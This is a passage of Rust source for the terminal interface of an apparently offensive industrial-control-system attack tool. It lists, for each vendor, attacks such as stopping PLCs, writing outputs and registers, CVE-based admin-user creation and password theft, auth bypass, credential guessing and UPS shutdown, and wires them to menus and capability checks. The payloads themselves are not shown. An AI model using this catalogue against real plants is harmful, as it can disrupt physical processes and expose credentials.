#![allow(clippy::too_many_lines)]
use crate::core::autodetect::{detect_device, DeviceInfo};
use crate::core::network::{get_interfaces, local_ip_for, NetworkInterface};
use crate::db::{Database, DeviceRecord};
use anyhow::Result;
use crossterm::event::{self, Event, KeyCode, KeyEventKind, KeyModifiers};
use ratatui::{
    backend::Backend,
    layout::{Constraint, Direction, Layout, Rect},
    style::{Color, Modifier, Style},
    text::{Line, Span},
    widgets::{Block, Borders, Clear, List, ListItem, ListState, Paragraph, Wrap},
    Frame, Terminal,
};
use serde_json::Value;
use std::collections::{HashMap, VecDeque};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{mpsc, Arc};
use std::time::Duration;

// ─── Background events ───────────────────────────────────────────────────────

enum ScanEvent {
    DeviceFound(DeviceInfo),
    Done(String),
    Output(String),
}

// ─── Exploit catalogue ───────────────────────────────────────────────────────

struct ExploitDef {
    label: &'static str,
    needs_input: bool,
    input_hint: &'static str,
    is_monitor: bool,
    requirement: ExploitRequirement,
    risk: ExploitRisk,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ExploitRequirement {
    None,
    Capability(CapabilityKey),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
enum CapabilityKey {
    BeckhoffAds,
    BeckhoffUdpDiscovery,
    BeckhoffWeb,
    S7Tcp,
    SchneiderIdentity,
    SchneiderModbus,
    SchneiderWeb,
    Fc90Classic,
    Fc90Tm221,
    PhoenixInfo,
    PhoenixWebVisit,
    EwonHttp,
    EnipTcp,
    MitsubishiIdentity,
    MitsubishiControlUdp,
    SlmpTcp,
    FinsTcp,
    Iec104Tcp,
    SnmpUdp,
    SnmpWrite,
    SnmpApc,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ExploitRisk {
    ReadOnly,
    SensitiveRead,
    LongRunning,
    WriteControl,
}

impl ExploitDef {
    fn new(label: &'static str) -> Self {
        Self {
            label,
            needs_input: false,
            input_hint: "",
            is_monitor: false,
            requirement: ExploitRequirement::None,
            risk: ExploitRisk::ReadOnly,
        }
    }
    fn with_input(label: &'static str, hint: &'static str) -> Self {
        Self {
            label,
            needs_input: true,
            input_hint: hint,
            is_monitor: false,
            requirement: ExploitRequirement::None,
            risk: ExploitRisk::ReadOnly,
        }
    }
    fn requires(mut self, requirement: ExploitRequirement) -> Self {
        self.requirement = requirement;
        self
    }
    fn capability(self, capability: CapabilityKey) -> Self {
        self.requires(ExploitRequirement::Capability(capability))
    }
    fn risk(mut self, risk: ExploitRisk) -> Self {
        self.risk = risk;
        self
    }
}

fn exploits_for(vendor: &str) -> Vec<ExploitDef> {
    let mut defs = match vendor.to_lowercase().as_str() {
        "beckhoff" => vec![
            ExploitDef::new("Get TwinCAT Info").capability(CapabilityKey::BeckhoffAds),
            ExploitDef::new("Set State: run")
                .capability(CapabilityKey::BeckhoffAds)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Set State: config")
                .capability(CapabilityKey::BeckhoffAds)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Reboot [CVE-2015-4051]")
                .capability(CapabilityKey::BeckhoffWeb)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Add Admin User [CVE-2015-4051]", "username:password")
                .capability(CapabilityKey::BeckhoffWeb)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Read Runtime State").capability(CapabilityKey::BeckhoffAds),
            ExploitDef::with_input("Inject Route [ADS pivot]", "username:password")
                .capability(CapabilityKey::BeckhoffUdpDiscovery)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Enumerate Symbols (ADS)").capability(CapabilityKey::BeckhoffAds),
            ExploitDef::with_input("Write Symbol (ADS)", "SymbolName=hexvalue")
                .capability(CapabilityKey::BeckhoffAds)
                .risk(ExploitRisk::WriteControl),
        ],
        "siemens" => vec![
            ExploitDef::new("Read CPU State").capability(CapabilityKey::S7Tcp),
            ExploitDef::new("Read I/O (inputs/outputs/merkers)").capability(CapabilityKey::S7Tcp),
            ExploitDef::new("Toggle CPU State (run\u{2194}stop)")
                .capability(CapabilityKey::S7Tcp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Set Outputs", "01010101")
                .capability(CapabilityKey::S7Tcp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Set Merkers", "bits:offset")
                .capability(CapabilityKey::S7Tcp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("List Data Blocks")
                .capability(CapabilityKey::S7Tcp)
                .risk(ExploitRisk::LongRunning),
            ExploitDef::with_input("Read Data Block", "DB1:0:64").capability(CapabilityKey::S7Tcp),
            ExploitDef::with_input("Write Data Block", "DB1:0:deadbeef")
                .capability(CapabilityKey::S7Tcp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Try Default Passwords")
                .capability(CapabilityKey::S7Tcp)
                .risk(ExploitRisk::SensitiveRead),
        ],
        "schneider" | "modicon" => vec![
            ExploitDef::new("Flash LED")
                .capability(CapabilityKey::SchneiderIdentity)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Session Hijack: get info [CVE-2017-6026]")
                .capability(CapabilityKey::SchneiderWeb)
                .risk(ExploitRisk::SensitiveRead),
            ExploitDef::new("Session Hijack: stop PLC [CVE-2017-6026]")
                .capability(CapabilityKey::SchneiderWeb)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Session Hijack: run PLC [CVE-2017-6026]")
                .capability(CapabilityKey::SchneiderWeb)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Map Modbus: Quick").capability(CapabilityKey::SchneiderModbus),
            ExploitDef::new("Map Modbus: Common").capability(CapabilityKey::SchneiderModbus),
            ExploitDef::with_input("Map Modbus: Custom", "hr:0:500,ir:0:100,co:0:128,di:0:128")
                .capability(CapabilityKey::SchneiderModbus),
            ExploitDef::new("Map Modbus: All")
                .capability(CapabilityKey::SchneiderModbus)
                .risk(ExploitRisk::LongRunning),
            ExploitDef::with_input("Read Holding Registers", "0:100")
                .capability(CapabilityKey::SchneiderModbus),
            ExploitDef::with_input("Read Coils", "0:64").capability(CapabilityKey::SchneiderModbus),
            ExploitDef::with_input("Read Input Registers", "0:100")
                .capability(CapabilityKey::SchneiderModbus),
            ExploitDef::with_input("Read Discrete Inputs", "0:64")
                .capability(CapabilityKey::SchneiderModbus),
            ExploitDef::with_input("Write Coil", "addr:on|off")
                .capability(CapabilityKey::SchneiderModbus)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Write Register", "addr:value")
                .capability(CapabilityKey::SchneiderModbus)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Write Multiple Registers", "start:v0,v1,...")
                .capability(CapabilityKey::SchneiderModbus)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("FC90 Stop PLC [M340/Quantum]")
                .capability(CapabilityKey::Fc90Classic)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("FC90 Start PLC [M340/Quantum]")
                .capability(CapabilityKey::Fc90Classic)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("FC90 Stop TM221")
                .capability(CapabilityKey::Fc90Tm221)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("FC90 Start TM221")
                .capability(CapabilityKey::Fc90Tm221)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("FC90 Force Output", "byte:on|off|unforce")
                .capability(CapabilityKey::Fc90Classic)
                .risk(ExploitRisk::WriteControl),
        ],
        "phoenix" => vec![
            ExploitDef::new("Get Passwords [CVE-2016-8366]")
                .capability(CapabilityKey::PhoenixWebVisit)
                .risk(ExploitRisk::SensitiveRead),
            ExploitDef::new("List Tags [CVE-2016-8380]").capability(CapabilityKey::PhoenixWebVisit),
            ExploitDef::new("Read Tag Values [CVE-2016-8380]")
                .capability(CapabilityKey::PhoenixWebVisit),
            ExploitDef::with_input("Write Tag [CVE-2016-8380]", "TagName=value")
                .capability(CapabilityKey::PhoenixWebVisit)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Get Device Info (ProConOS)").capability(CapabilityKey::PhoenixInfo),
            ExploitDef::with_input("Control ILC150", "stop|run:cold|warm|hot")
                .capability(CapabilityKey::PhoenixInfo)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Control ILC390", "stop|run")
                .capability(CapabilityKey::PhoenixInfo)
                .risk(ExploitRisk::WriteControl),
        ],
        "ewon" => vec![
            ExploitDef::with_input("Extract Credentials (auth bypass)", "adm:20")
                .capability(CapabilityKey::EwonHttp)
                .risk(ExploitRisk::SensitiveRead),
        ],
        "rockwell" | "enip" => vec![
            ExploitDef::new("Get Device Identity").capability(CapabilityKey::EnipTcp),
            ExploitDef::new("List Tags")
                .capability(CapabilityKey::EnipTcp)
                .risk(ExploitRisk::LongRunning),
            ExploitDef::with_input("Read Tag", "TagName").capability(CapabilityKey::EnipTcp),
            ExploitDef::with_input("Write Tag", "TagName=hexvalue")
                .capability(CapabilityKey::EnipTcp)
                .risk(ExploitRisk::WriteControl),
        ],
        "mitsubishi" => vec![
            ExploitDef::new("Get Device Info (SLMP)").capability(CapabilityKey::MitsubishiIdentity),
            ExploitDef::new("Map SLMP: Quick").capability(CapabilityKey::SlmpTcp),
            ExploitDef::new("Map SLMP: Common").capability(CapabilityKey::SlmpTcp),
            ExploitDef::with_input("Map SLMP: Custom", "d:0:100,m:0:128")
                .capability(CapabilityKey::SlmpTcp),
            ExploitDef::new("Map SLMP: All")
                .capability(CapabilityKey::SlmpTcp)
                .risk(ExploitRisk::LongRunning),
            ExploitDef::new("Set State: run")
                .capability(CapabilityKey::MitsubishiControlUdp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Set State: stop")
                .capability(CapabilityKey::MitsubishiControlUdp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("Set State: pause")
                .capability(CapabilityKey::MitsubishiControlUdp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Read D Registers", "0:50").capability(CapabilityKey::SlmpTcp),
            ExploitDef::with_input("Read M Bits", "0:64").capability(CapabilityKey::SlmpTcp),
            ExploitDef::with_input("Write D Registers", "start:v0,v1,...")
                .capability(CapabilityKey::SlmpTcp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Write M Bits", "start:0101...")
                .capability(CapabilityKey::SlmpTcp)
                .risk(ExploitRisk::WriteControl),
        ],
        "omron" => vec![
            ExploitDef::new("Get Device Info (FINS)").capability(CapabilityKey::FinsTcp),
            ExploitDef::with_input("Read DM Words", "start:count")
                .capability(CapabilityKey::FinsTcp),
            ExploitDef::with_input("Write DM Words", "start:v0,v1,...")
                .capability(CapabilityKey::FinsTcp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("CPU Status").capability(CapabilityKey::FinsTcp),
            ExploitDef::new("CPU Run")
                .capability(CapabilityKey::FinsTcp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::new("CPU Stop")
                .capability(CapabilityKey::FinsTcp)
                .risk(ExploitRisk::WriteControl),
        ],
        "iec104" => vec![
            ExploitDef::new("General Interrogation").capability(CapabilityKey::Iec104Tcp),
            ExploitDef::with_input("Single Command ON", "ioa")
                .capability(CapabilityKey::Iec104Tcp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Single Command OFF", "ioa")
                .capability(CapabilityKey::Iec104Tcp)
                .risk(ExploitRisk::WriteControl),
            ExploitDef::with_input("Double Command", "ioa:state")
                .capability(CapabilityKey::Iec104Tcp)
                .risk(ExploitRisk::WriteControl),
        ],
        "snmp" => vec![
            ExploitDef::new("System Info (sysDescr / OID / uptime)").capability(CapabilityKey::SnmpUdp),
            ExploitDef::new("Interface Table (MAC / speed / errors)").capability(CapabilityKey::SnmpUdp),
            ExploitDef::new("Network Topology (IP addrs / routes / ARP)").capability(CapabilityKey::SnmpUdp),
            ExploitDef::new("Community Scan (try common strings)").capability(CapabilityKey::SnmpUdp).risk(ExploitRisk::SensitiveRead),
            ExploitDef::new("CVE Probe (match sysDescr → advisories)").capability(CapabilityKey::SnmpUdp),
            ExploitDef::with_input("Walk OID Subtree", "OID (default: 1.3.6.1.2.1.1)")
                .capability(CapabilityKey::SnmpUdp)
                .risk(ExploitRisk::LongRunning),
            ExploitDef::with_input("Test Write Access (SET sysName → same value)", "write community (default: private)")
                .capability(CapabilityKey::SnmpWrite)
                .risk(ExploitRisk::SensitiveRead),
            ExploitDef::new("APC UPS: Status (battery / load / runtime)").capability(CapabilityKey::SnmpApc),
            ExploitDef::with_input("APC UPS: Graceful Shutdown [DESTRUCTIVE]", "write community (default: private)")
                .capability(CapabilityKey::SnmpApc)
                .risk(ExploitRisk::WriteControl),
        ],
        _ => vec![ExploitDef::new("Auto-detect / rescan")],
    };
    defs.push(ExploitDef::new("\u{2190} Return"));
    defs
}

const ALL_VENDORS: &[&str] = &[
    "siemens",
    "beckhoff",
    "rockwell",
    "enip",
    "schneider",
    "modicon",
    "mitsubishi",
    "phoenix",
    "omron",
    "ewon",
    "iec104",
];

const SCAN_ITEMS: &[&str] = &[
    "All vendors (parallel broadcast)",
    "Beckhoff TwinCAT   (UDP 48899)",
    "EtherNet/IP CIP    (UDP 44818)",
    "Schneider Electric (UDP 1740 broadcast)",
    "Mitsubishi MELSEC  (UDP 5561)",
    "eWON IPCONF        (UDP 1507)",
    "\u{2190} Return",
];

const SCAN_BACK_IDX: usize = SCAN_ITEMS.len() - 1;

#[derive(Debug, Clone)]
struct TargetScan {
    ip: String,
    port: Option<u16>,
    transport: Option<TargetTransport>,
    vendor: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum TargetTransport {
    Udp,
    Tcp,
    Both,
}

impl TargetScan {
    fn new(ip: String) -> Self {
        Self {
            ip,
            port: None,
            transport: None,
            vendor: None,
        }
    }

    fn label(&self) -> String {
        let port = self.port.map_or(String::new(), |p| format!(":{p}"));
        let transport = self
            .transport
            .map_or(String::new(), |t| format!(" {}", target_transport_label(t)));
        let vendor = self
            .vendor
            .as_deref()
            .map_or(String::new(), |v| format!(" {v}"));
        format!("{}{}{}{}", self.ip, port, transport, vendor)
    }

    fn should_try_schneider(&self) -> bool {
        matches!(self.vendor.as_deref(), Some("schneider" | "modicon"))
            || (self.vendor.is_none() && (self.port.is_some() || self.transport.is_some()))
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SchneiderFamily {
    ClassicFc90,
    Tm221,
    Unknown,
}

impl SchneiderFamily {
    fn as_field(self) -> &'static str {
        match self {
            Self::ClassicFc90 => "m340_quantum_premium",
            Self::Tm221 => "tm221",
            Self::Unknown => "unknown",
        }
    }

    fn from_field(value: Option<&str>) -> Self {
        match value.unwrap_or_default() {
            "m340_quantum_premium" => Self::ClassicFc90,
            "tm221" => Self::Tm221,
            _ => Self::Unknown,
        }
    }

    fn from_name(name: &str) -> Self {
        let name = name.to_ascii_lowercase();
        if name.contains("tm221") {
            Self::Tm221
        } else if name.contains("m340")
            || name.contains("quantum")
            || name.contains("premium")
            || name.contains("m580")
        {
            Self::ClassicFc90
        } else {
            Self::Unknown
        }
    }

    fn label(self) -> &'static str {
        match self {
            Self::ClassicFc90 => "M340/Quantum/Premium",
            Self::Tm221 => "TM221",
            Self::Unknown => "unknown",
        }
    }
}

#[derive(Debug, Clone)]
struct SchneiderCapabilities {
    identity_confirmed: bool,
    udp_discovery_confirmed: bool,
    modbus_tcp_confirmed: bool,
    modbus_port: u16,
    web_port: Option<u16>,
    fc90_family: SchneiderFamily,
}

impl SchneiderCapabilities {
    fn from_device(dev: &DeviceRecord) -> Self {
        let fields = &dev.fields;
        let cap_identity = field_bool(fields, "cap_identity_confirmed");
        let cap_udp = field_bool(fields, "cap_schneider_udp");
        let cap_modbus = field_bool(fields, "cap_modbus_tcp");
        let name = field_str(fields, "name").unwrap_or_default();
        let protocol = field_str(fields, "protocol").unwrap_or_default();
        let discovery_transport = field_str(fields, "discovery_transport").unwrap_or_default();
        let identity_name = is_schneider_identity_name(name);
        let identity_confirmed = cap_identity
            || identity_name
            || (discovery_transport == "udp" && !name.is_empty() && !name.contains("compatible"));
        let udp_discovery_confirmed =
            cap_udp || (discovery_transport == "udp" && identity_confirmed);
        let modbus_tcp_confirmed = cap_modbus
            || protocol == "modbus_tcp"
            || (discovery_transport == "tcp" && field_port_value(fields, "modbus_port").is_some());
        let modbus_port =
            field_port_value(fields, "modbus_port").unwrap_or(crate::core::modbus::DEFAULT_PORT);
        let web_port = field_port_value(fields, "web_port");
        let fc90_family = SchneiderFamily::from_field(field_str(fields, "fc90_family"))
            .max_confidence(SchneiderFamily::from_name(name));

        Self {
            identity_confirmed,
            udp_discovery_confirmed,
            modbus_tcp_confirmed,
            modbus_port,
            web_port,
            fc90_family,
        }
    }

    fn web_candidate(&self) -> bool {
        self.identity_confirmed || self.web_port.is_some()
    }
}

impl SchneiderFamily {
    fn max_confidence(self, fallback: Self) -> Self {
        if self == Self::Unknown {
            fallback
        } else {
            self
        }
    }
}

#[derive(Clone)]
struct PendingExploit {
    vendor: String,
    idx: usize,
    ip: String,
    port: u16,
    input: String,
    label: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ActionAvailability {
    enabled: bool,
    reason: Option<&'static str>,
}

// ─── App state ───────────────────────────────────────────────────────────────

#[derive(Clone, PartialEq)]
enum Mode {
    Normal,
    IpInput,
    ScanMenu,
    ExploitMenu,
    ExploitInput,
    ExploitConfirm,
    VendorPicker,
    Search,
    Help,
    OutputZoom,
}

struct App {
    devices: Vec<DeviceRecord>,
    list_state: ListState,
    mode: Mode,
    zoom_from: Mode,
    quit_confirm: bool,
    monitor_stop: Option<Arc<AtomicBool>>,
    input_buf: String,
    output_lines: Vec<String>,
    output_scroll: usize,
    logs: VecDeque<String>,
    scan_rx: mpsc::Receiver<ScanEvent>,
    scan_tx: mpsc::Sender<ScanEvent>,
    scan_menu_sel: usize,
    exploit_defs: Vec<ExploitDef>,
    exploit_sel: usize,
    pending_exploit: Option<PendingExploit>,
    vendor_override: Option<String>,
    vendor_pick_sel: usize,
    filter: String,
    filtered_indices: Vec<usize>,
    active_jobs: u32,
}

impl App {
    fn new(db: &Database) -> Self {
        let (tx, rx) = mpsc::channel();
        let devices = db.load_devices().unwrap_or_default();
        let n = devices.len();
        let filtered_indices: Vec<usize> = (0..n).collect();
        let mut list_state = ListState::default();
        if n > 0 {
            list_state.select(Some(0));
        }
        Self {
            devices,
            list_state,
            mode: Mode::Normal,
            zoom_from: Mode::Normal,
            quit_confirm: false,
            monitor_stop: None,
            input_buf: String::new(),
            output_lines: Vec::new(),
            output_scroll: 0,
            logs: VecDeque::with_capacity(200),
            scan_rx: rx,
            scan_tx: tx,
            scan_menu_sel: 0,
            exploit_defs: Vec::new(),
            exploit_sel: 0,
            pending_exploit: None,
            vendor_override: None,
            vendor_pick_sel: 0,
            filter: String::new(),
            filtered_indices,
            active_jobs: 0,
        }
    }

    fn selected_device(&self) -> Option<&DeviceRecord> {
        let idx = self.filtered_indices.get(self.list_state.selected()?)?;
        self.devices.get(*idx)
    }

    fn selected_device_ip(&self) -> Option<String> {
        self.selected_device().map(|d| d.ip.clone())
    }

    fn selected_vendor(&self) -> Option<String> {
        self.vendor_override
            .clone()
            .or_else(|| self.selected_device().map(|d| d.vendor.clone()))
    }

    fn device_port(&self, default: u16) -> u16 {
        self.field_port(&["port"], default)
    }

    fn field_port(&self, keys: &[&str], default: u16) -> u16 {
        self.selected_device()
            .and_then(|d| {
                keys.iter()
                    .find_map(|key| d.fields.get(*key)?.as_u64())
                    .and_then(|n| u16::try_from(n).ok())
            })
            .unwrap_or(default)
    }

    fn action_port(&self, vendor: &str, idx: usize) -> u16 {
        match vendor.to_ascii_lowercase().as_str() {
            "beckhoff" => match idx {
                0 | 1 | 2 | 5 | 7 | 8 => self.field_port(
                    &["ads_port", "port"],
                    crate::vendors::beckhoff::scan::DEFAULT_ADS_PORT,
                ),
                3 | 4 => self.field_port(
                    &["web_port"],
                    crate::vendors::beckhoff::webcontrol::DEFAULT_WEB_PORT,
                ),
                _ => self.device_port(0),
            },
            "mitsubishi" => match idx {
                0..=4 | 8..=11 => self.field_port(
                    &["slmp_port", "port"],
                    crate::vendors::mitsubishi::slmp::DEFAULT_PORT,
                ),
                _ => self.device_port(0),
            },
            "schneider" | "modicon" => match idx {
                1..=3 => self.field_port(&["web_port"], 80),
                4..=19 => {
                    self.field_port(&["modbus_port", "port"], crate::core::modbus::DEFAULT_PORT)
                }
                _ => self.device_port(0),
            },
            "siemens" => self.field_port(&["s7_port", "port"], 102),
            "rockwell" | "enip" => self.field_port(&["enip_port", "port"], 44818),
            "phoenix" => match idx {
                0..=3 => self.field_port(&["webvisit_port", "http_port", "web_port"], 80),
                4 => self.field_port(&["phoenix_info_port", "port"], 1962),
                5 => self.field_port(&["phoenix_ilc150_port"], 0),
                6 => self.field_port(&["phoenix_ilc390_port"], 0),
                _ => self.device_port(0),
            },
            "ewon" => self.field_port(&["http_port", "web_port", "port"], 80),
            "omron" => self.field_port(
                &["fins_port", "port"],
                crate::vendors::omron::fins::FINS_TCP_PORT,
            ),
            "iec104" => self.field_port(
                &["iec104_port", "port"],
                crate::vendors::iec104::client::IEC104_PORT,
            ),
            _ => self.device_port(0),
        }
    }

    fn rebuild_filtered(&mut self) {
        if self.filter.is_empty() {
            self.filtered_indices = (0..self.devices.len()).collect();
        } else {
            let q = self.filter.to_lowercase();
            self.filtered_indices = self
                .devices
                .iter()
                .enumerate()
                .filter(|(_, d)| {
                    d.ip.to_lowercase().contains(&q) || d.vendor.to_lowercase().contains(&q)
                })
                .map(|(i, _)| i)
                .collect();
        }
        let n = self.filtered_indices.len();
        if n == 0 {
            self.list_state.select(None);
        } else {
            let cur = self.list_state.selected().unwrap_or(0).min(n - 1);
            self.list_state.select(Some(cur));
        }
    }

    fn reload(&mut self, db: &Database) {
        self.devices = db.load_devices().unwrap_or_default();
        self.rebuild_filtered();
    }

    fn log(&mut self, msg: impl Into<String>) {
        if self.logs.len() >= 200 {
            self.logs.pop_front();
        }
        self.logs.push_back(msg.into());
    }

    fn select_next(&mut self) {
        let n = self.filtered_indices.len();
        if n == 0 {
            return;
        }
        let i = self.list_state.selected().unwrap_or(0);
        self.list_state.select(Some((i + 1).min(n - 1)));
    }

    fn select_prev(&mut self) {
        if self.filtered_indices.is_empty() {
            return;
        }
        let i = self.list_state.selected().unwrap_or(0);
        self.list_state.select(Some(i.saturating_sub(1)));
    }

    fn drain_scan_events(&mut self, db: &Database) {
        while let Ok(ev) = self.scan_rx.try_recv() {
            match ev {
                ScanEvent::DeviceFound(info) => {
                    let fields = serde_json::to_value(&info.fields).unwrap_or_default();
                    let _ = db.upsert_device(&info.ip, &info.vendor, &fields);
                    let _ = db.log(&info.ip, &format!("discovered vendor={}", info.vendor));
                    self.log(format!("[+] {} \u{2192} {}", info.ip, info.vendor));
                    self.reload(db);
                }
                ScanEvent::Done(msg) => {
                    self.output_lines.push(format!("── done: {msg} ──"));
                    self.log(format!("[*] {msg}"));
                    self.active_jobs = self.active_jobs.saturating_sub(1);
                }
                ScanEvent::Output(line) => {
                    if self.output_lines.len() >= 500 {
                        self.output_lines.remove(0);
                    }
                    self.output_lines.push(line);
                }
            }
        }
    }

    fn open_exploit_menu(&mut self) {
        if let Some(vendor) = self.selected_device().map(|d| d.vendor.clone()) {
            self.vendor_override = None;
            self.exploit_defs = exploits_for(&vendor);
            self.exploit_sel = 0;
            self.mode = Mode::ExploitMenu;
        }
    }

    fn scroll_output_up(&mut self, n: usize) {
        self.output_scroll = self
            .output_scroll
            .saturating_add(n)
            .min(self.output_lines.len().saturating_sub(1));
    }

    fn scroll_output_down(&mut self, n: usize) {
        self.output_scroll = self.output_scroll.saturating_sub(n);
    }

    fn enter_zoom(&mut self) {
        self.zoom_from = self.mode.clone();
        self.mode = Mode::OutputZoom;
    }

    fn exit_zoom(&mut self) {
        self.mode = self.zoom_from.clone();
    }
}

// ─── Scan workers ────────────────────────────────────────────────────────────

fn action_availability(app: &App, exploit: &ExploitDef) -> ActionAvailability {
    if exploit.label.starts_with('\u{2190}') {
        return ActionAvailability {
            enabled: true,
            reason: None,
        };
    }
    match exploit.requirement {
        ExploitRequirement::None => ActionAvailability {
            enabled: true,
            reason: None,
        },
        ExploitRequirement::Capability(capability) => {
            let Some(dev) = app.selected_device() else {
                return ActionAvailability {
                    enabled: false,
                    reason: Some("no device selected"),
                };
            };
            capability_availability(dev, capability)
        }
    }
}

fn capability_availability(dev: &DeviceRecord, capability: CapabilityKey) -> ActionAvailability {
    let fields = &dev.fields;
    let vendor = dev.vendor.to_ascii_lowercase();
    let protocol = field_str(fields, "protocol").unwrap_or_default();
    let discovery_transport = field_str(fields, "discovery_transport").unwrap_or_default();

    let has_port = |keys: &[&str]| {
        keys.iter()
            .any(|key| field_port_value(fields, key).is_some())
    };
    let enabled = match capability {
        CapabilityKey::BeckhoffAds => {
            field_bool_value(fields, "cap_ads_tcp").unwrap_or_else(|| {
                protocol == "ads_tcp"
                    || has_port(&["ads_port"])
                    || (vendor == "beckhoff" && has_port(&["port"]))
            })
        }
        CapabilityKey::BeckhoffUdpDiscovery => field_bool_value(fields, "cap_ads_udp_discovery")
            .unwrap_or(vendor == "beckhoff" && discovery_transport == "udp"),
        CapabilityKey::BeckhoffWeb => field_bool_value(fields, "cap_beckhoff_web_candidate")
            .unwrap_or(vendor == "beckhoff" && has_port(&["web_port"])),
        CapabilityKey::S7Tcp => field_bool_value(fields, "cap_s7_tcp").unwrap_or_else(|| {
            has_port(&["s7_port"])
                || (vendor == "siemens" && has_port(&["port"]))
                || fields
                    .get("open_ports")
                    .and_then(Value::as_array)
                    .is_some_and(|ports| ports.iter().any(|p| p.as_u64() == Some(102)))
        }),
        CapabilityKey::SchneiderIdentity => {
            SchneiderCapabilities::from_device(dev).identity_confirmed
        }
        CapabilityKey::SchneiderModbus => {
            SchneiderCapabilities::from_device(dev).modbus_tcp_confirmed
        }
        CapabilityKey::SchneiderWeb => SchneiderCapabilities::from_device(dev).web_candidate(),
        CapabilityKey::Fc90Classic => {
            let caps = SchneiderCapabilities::from_device(dev);
            caps.modbus_tcp_confirmed && caps.fc90_family == SchneiderFamily::ClassicFc90
        }
        CapabilityKey::Fc90Tm221 => {
            let caps = SchneiderCapabilities::from_device(dev);
            caps.modbus_tcp_confirmed && caps.fc90_family == SchneiderFamily::Tm221
        }
        CapabilityKey::PhoenixInfo => {
            field_bool_value(fields, "cap_phoenix_info").unwrap_or_else(|| {
                has_port(&["phoenix_info_port"]) || fields.get("plc_type").is_some()
            })
        }
        CapabilityKey::PhoenixWebVisit => field_bool_value(fields, "cap_webvisit_candidate")
            .unwrap_or_else(|| {
                has_port(&["webvisit_port", "http_port", "web_port"]) || vendor == "phoenix"
            }),
        CapabilityKey::EwonHttp => field_bool_value(fields, "cap_ewon_http_candidate")
            .unwrap_or_else(|| has_port(&["http_port", "web_port"]) || vendor == "ewon"),
        CapabilityKey::EnipTcp => {
            field_bool_value(fields, "cap_enip_tcp_identity").unwrap_or_else(|| {
                has_port(&["enip_port"])
                    || (matches!(vendor.as_str(), "rockwell" | "enip") && has_port(&["port"]))
                    || fields.get("product_name").is_some()
            })
        }
        CapabilityKey::MitsubishiIdentity => field_bool_value(fields, "cap_mitsubishi_identity")
            .unwrap_or_else(|| {
                field_bool(fields, "cap_gxworks_udp")
                    || field_bool(fields, "cap_slmp_tcp")
                    || fields.get("plc_type").is_some()
            }),
        CapabilityKey::MitsubishiControlUdp => field_bool_value(fields, "cap_gxworks_udp")
            .unwrap_or_else(|| {
                vendor == "mitsubishi"
                    && matches!(discovery_transport, "udp" | "both")
                    && has_port(&["discovery_port"])
            }),
        CapabilityKey::SlmpTcp => field_bool_value(fields, "cap_slmp_tcp").unwrap_or_else(|| {
            protocol == "slmp_tcp"
                || has_port(&["slmp_port"])
                || (vendor == "mitsubishi" && has_port(&["port"]))
        }),
        CapabilityKey::FinsTcp => field_bool_value(fields, "cap_fins_tcp").unwrap_or_else(|| {
            has_port(&["fins_port"]) || (vendor == "omron" && has_port(&["port"]))
        }),
        CapabilityKey::Iec104Tcp => {
            field_bool_value(fields, "cap_iec104_tcp").unwrap_or_else(|| {
                has_port(&["iec104_port"]) || (vendor == "iec104" && has_port(&["port"]))
            })
        }
        CapabilityKey::SnmpUdp => {
            field_bool_value(fields, "cap_snmp_udp")
                .unwrap_or_else(|| has_port(&["snmp_port"]) || vendor == "snmp")
        }
        CapabilityKey::SnmpWrite => {
            // Enabled if we know a write community exists, or the user can supply one
            field_bool_value(fields, "cap_snmp_udp")
                .unwrap_or_else(|| vendor == "snmp")
        }
        CapabilityKey::SnmpApc => {
            field_bool_value(fields, "cap_snmp_apc").unwrap_or(false)
        }
    };

    ActionAvailability {
        enabled,
        reason: (!enabled).then_some(capability_missing_reason(capability)),
    }
}

fn capability_missing_reason(capability: CapabilityKey) -> &'static str {
    match capability {
        CapabilityKey::BeckhoffAds => "Beckhoff ADS TCP has not been confirmed",
        CapabilityKey::BeckhoffUdpDiscovery => "Beckhoff UDP discovery has not been confirmed",
        CapabilityKey::BeckhoffWeb => "Beckhoff web interface has not been identified",
        CapabilityKey::S7Tcp => "Siemens S7 TCP has not been confirmed",
        CapabilityKey::SchneiderIdentity => "Schneider identity has not been confirmed",
        CapabilityKey::SchneiderModbus => "Modbus TCP has not been confirmed for this device",
        CapabilityKey::SchneiderWeb => "Schneider web interface has not been identified",
        CapabilityKey::Fc90Classic => "FC90 classic family not identified",
        CapabilityKey::Fc90Tm221 => "TM221 family not identified",
        CapabilityKey::PhoenixInfo => "Phoenix ProConOS info service has not been confirmed",
